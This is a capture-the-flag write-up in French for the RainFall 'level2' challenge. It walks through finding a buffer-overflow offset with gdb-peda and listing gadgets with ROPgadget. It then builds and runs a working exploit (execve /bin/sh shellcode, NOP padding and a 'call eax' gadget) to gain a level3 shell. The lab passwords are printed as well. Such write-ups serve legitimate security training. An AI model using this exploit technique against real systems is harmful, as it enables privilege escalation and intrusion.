# LEVEL 2

### Reconnaissance

On se connecte sur le compte level02 avec le password : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

Sa commence comme le niveau précédent:
```
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
level2@RainFall:~$ file level2 
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
level2@RainFall:~$ ./level2 
qqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqq
level2@RainFall:~$ ./level2 
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
Segmentation fault (core dumped)
```

En reversant le programme, on peux voir 2 fonctions: *main() et p()*

La fonction main() ne fait rien, elle appel directement la fonction p(). p() fait un appel a fgets()

Avant toute chose, il faut déjà trouvé a qu'elle moment on ecrit sur EIP. Pour cela j'utilise le plugin <a href="https://github.com/longld/peda">gdb-peda</a> sur mon poste:
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
Starting program: /home/yoginet/Documents/101/rainfall/level2/level2 < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x804b5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0x0 
EDX: 0xffffd17c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0x41344141 ('AA4A')
ESP: 0xffffd1d0 ("fAA5AAKAAgAA6AAL")
EIP: 0x41414a41 ('AJAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414a41
[------------------------------------stack-------------------------------------]
0000| 0xffffd1d0 ("fAA5AAKAAgAA6AAL")
0004| 0xffffd1d4 ("AAKAAgAA6AAL")
0008| 0xffffd1d8 ("AgAA6AAL")
0012| 0xffffd1dc ("6AAL")
0016| 0xffffd1e0 --> 0x0 
0020| 0xffffd1e4 --> 0xffffd284 --> 0xffffd42a ("/home/yoginet/Documents/101/rainfall/level2/level2")
0024| 0xffffd1e8 --> 0xffffd28c --> 0xffffd45d ("SHELL=/bin/bash")
0028| 0xffffd1ec --> 0xffffd214 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern offset 0x41414a41
1094797889 found at offset: 80
```
Offset 80. De plus on peux remarqué que au moment ou on segfault, la valeur de notre buffer est dans EAX.

Maintenant, on se retrouve confronté a un problème, nous n'avons pas la possibilté d'écrire directement une adresse de la stack (commencant par 0xb).
C'est ce morceau de code qui nous empèche de le faire:
```
if ((local_res0 & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",local_res0);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
```

Nous n'avons donc pas la possibilité d'envoyé une adresse de la stack mais notre payload est dans EAX :).

### Exploitation

On va donc utilisé un outil : <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>

Il va nous permettre de trouvé des gadjets, des morceaux de code que l'on se sert généralement pour faire du <a href="https://beta.hackndo.com/return-oriented-programming/">ROP</a>.

Voyons qu'elle gadjet peux nous aider:
```
Gadgets information
============================================================
0x080483c7 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x080484c9 : add al, 0x24 ; pop eax ; xchg eax, edi ; add al, 8 ; call eax
0x080484a1 : add al, 0x5b ; pop ebp ; ret
0x0804849c : add al, 8 ; add dword ptr [ebx + 0x5d5b04c4], eax ; ret
0x080484cd : add al, 8 ; call eax
0x080485e4 : add al, 8 ; nop ; sub ebx, 4 ; call eax
0x080483a4 : add al, 8 ; push 0 ; jmp 0x8048397
0x080483c4 : add al, 8 ; push 0x10 ; jmp 0x8048397
0x080483d4 : add al, 8 ; push 0x18 ; jmp 0x8048397
0x080483e4 : add al, 8 ; push 0x20 ; jmp 0x8048397
0x080483f4 : add al, 8 ; push 0x28 ; jmp 0x8048397
0x08048404 : add al, 8 ; push 0x30 ; jmp 0x8048397
0x08048414 : add al, 8 ; push 0x38 ; jmp 0x8048397
0x080483b4 : add al, 8 ; push 8 ; jmp 0x8048397
0x080483a7 : add byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x0804835e : add byte ptr [eax], al ; add byte ptr [ebx - 0x7f], bl ; ret
0x0804837f : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080483a9 : add byte ptr [eax], al ; jmp 0x8048392
0x08048360 : add byte ptr [ebx - 0x7f], bl ; ret
0x0804849e : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
0x080485a9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804849f : add esp, 4 ; pop ebx ; pop ebp ; ret
0x08048381 : add esp, 8 ; pop ebx ; ret
0x080484ca : and al, 0x58 ; xchg eax, edi ; add al, 8 ; call eax
0x08048537 : and al, 0xe8 ; mov dword ptr [0xc9fffffe], eax ; ret
0x080483e7 : and byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x08048687 : call dword ptr [eax]
0x080484cf : call eax
0x080485f0 : clc ; push dword ptr [ebp - 0xc] ; add esp, 4 ; pop ebx ; pop ebp ; ret
0x080483c2 : cmp al, 0x98 ; add al, 8 ; push 0x10 ; jmp 0x8048399
0x08048417 : cmp byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x0804849b : cwde ; add al, 8 ; add dword ptr [ebx + 0x5d5b04c4], eax ; ret
0x080483a3 : cwde ; add al, 8 ; push 0 ; jmp 0x8048398
0x080483c3 : cwde ; add al, 8 ; push 0x10 ; jmp 0x8048398
0x080483d3 : cwde ; add al, 8 ; push 0x18 ; jmp 0x8048398
0x080483e3 : cwde ; add al, 8 ; push 0x20 ; jmp 0x8048398
0x080483f3 : cwde ; add al, 8 ; push 0x28 ; jmp 0x8048398
0x08048403 : cwde ; add al, 8 ; push 0x30 ; jmp 0x8048398
0x08048413 : cwde ; add al, 8 ; push 0x38 ; jmp 0x8048398
0x080483b3 : cwde ; add al, 8 ; push 8 ; jmp 0x8048398
0x080483f2 : dec eax ; cwde ; add al, 8 ; push 0x28 ; jmp 0x8048399
0x080485e2 : dec eax ; xchg eax, edi ; add al, 8 ; nop ; sub ebx, 4 ; call eax
0x0804853c : dec ecx ; ret
0x08048402 : dec esp ; cwde ; add al, 8 ; push 0x30 ; jmp 0x8048399
0x080485a8 : fild word ptr [ebx + 0x5e5b1cc4] ; pop edi ; pop ebp ; ret
0x080485f3 : hlt ; add esp, 4 ; pop ebx ; pop ebp ; ret
0x080483d2 : inc eax ; cwde ; add al, 8 ; push 0x18 ; jmp 0x8048399
0x080483e2 : inc esp ; cwde ; add al, 8 ; push 0x20 ; jmp 0x8048399
0x080484c6 : je 0x80484da ; mov dword ptr [esp], 0x8049758 ; call eax
0x080483ab : jmp 0x8048390
0x08048474 : jmp 0x8048477
0x0804846b : jmp 0x80484bd
0x080485b1 : jmp 0x80485c0
0x080485e9 : jmp 0x80485ef
0x080486eb : jmp dword ptr [ecx]
0x080485a7 : jne 0x8048591 ; add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080485f2 : jne 0x80485ef ; add esp, 4 ; pop ebx ; pop ebp ; ret
0x080484d1 : leave ; ret
0x080484a0 : les eax, ptr [ebx + ebx*2] ; pop ebp ; ret
0x080485aa : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048382 : les ecx, ptr [eax] ; pop ebx ; ret
0x08048539 : mov dword ptr [0xc9fffffe], eax ; ret
0x080484c8 : mov dword ptr [esp], 0x8049758 ; call eax
0x080485c2 : mov ebx, dword ptr [esp] ; ret
0x080485b8 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; ret
0x080485b9 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; ret
0x080485ba : nop ; nop ; nop ; nop ; nop ; nop ; ret
0x080485bb : nop ; nop ; nop ; nop ; nop ; ret
0x080485bc : nop ; nop ; nop ; nop ; ret
0x080485bd : nop ; nop ; nop ; ret
0x080485be : nop ; nop ; ret
0x080485bf : nop ; ret
0x080485e7 : nop ; sub ebx, 4 ; call eax
0x080484ce : or bh, bh ; ror cl, 1 ; ret
0x080483b7 : or byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x0804849d : or byte ptr [ecx], al ; add esp, 4 ; pop ebx ; pop ebp ; ret
0x080485e5 : or byte ptr [esi - 0x70], ah ; sub ebx, 4 ; call eax
0x080484c7 : or edi, eax ; add al, 0x24 ; pop eax ; xchg eax, edi ; add al, 8 ; call eax
0x080484cb : pop eax ; xchg eax, edi ; add al, 8 ; call eax
0x080484a3 : pop ebp ; ret
0x080484a2 : pop ebx ; pop ebp ; ret
0x080485ac : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048384 : pop ebx ; ret
0x080485ae : pop edi ; pop ebp ; ret
0x080485ad : pop esi ; pop edi ; pop ebp ; ret
0x080483a6 : push 0 ; jmp 0x8048395
0x080483c6 : push 0x10 ; jmp 0x8048395
0x080483d6 : push 0x18 ; jmp 0x8048395
0x080483e6 : push 0x20 ; jmp 0x8048395
0x080483f6 : push 0x28 ; jmp 0x8048395
0x08048406 : push 0x30 ; jmp 0x8048395
0x08048416 : push 0x38 ; jmp 0x8048395
0x080483b6 : push 8 ; jmp 0x8048395
0x080485f1 : push dword ptr [ebp - 0xc] ; add esp, 4 ; pop ebx ; pop ebp ; ret
0x08048412 : push eax ; cwde ; add al, 8 ; push 0x38 ; jmp 0x8048399
0x08048363 : ret
0x080484d0 : ror cl, 1 ; ret
0x080485c3 : sbb al, 0x24 ; ret
0x080485ab : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080483d7 : sbb byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x080483f7 : sub byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394
0x080485e8 : sub ebx, 4 ; call eax
0x080484cc : xchg eax, edi ; add al, 8 ; call eax
0x080485e3 : xchg eax, edi ; add al, 8 ; nop ; sub ebx, 4 ; call eax
0x080483a2 : xor al, 0x98 ; add al, 8 ; push 0 ; jmp 0x8048399
0x08048407 : xor byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x8048394

Unique gadgets found: 106
```

106 gadjets a notre disposition ! Et celui la est parfait :
```
0x080484cf : call eax
```

Et oui, on va pouvoir appeler eax par l'intermédiaire de ce gadjet.
On transforme notre adresse avec pwn:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41)                                                  
[GCC 9.3.0] on linux2                                                                           
Type "help", "copyright", "credits" or "license" for more information.                          
>>> from pwn import * 
>>> p32(0x080484cf)                                                                             
'\xcf\x84\x04\x08'  
```

Maintenant, il nous faut un payload qui n'utilise pas eax
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```
*details du shellcode dans les ressources*

**Notre payload final**

```
[shellcode (len 21)] + [NOP * 59] + [Adresse de notre gadjet]

python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 59 + "\xcf\x84\x04\x08"
```

On rajoutera la commande ```cat``` afin de ne pas perdre le shell:

```
level2@RainFall:~$ (python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 59 + "\xcf\x84\x04\x08"'; cat)|./level2 
1���Qh//shh/bin���
                  �������������������������������������������������������τ
ls
ls: cannot open directory .: Permission denied
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

whoami
level3
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
```



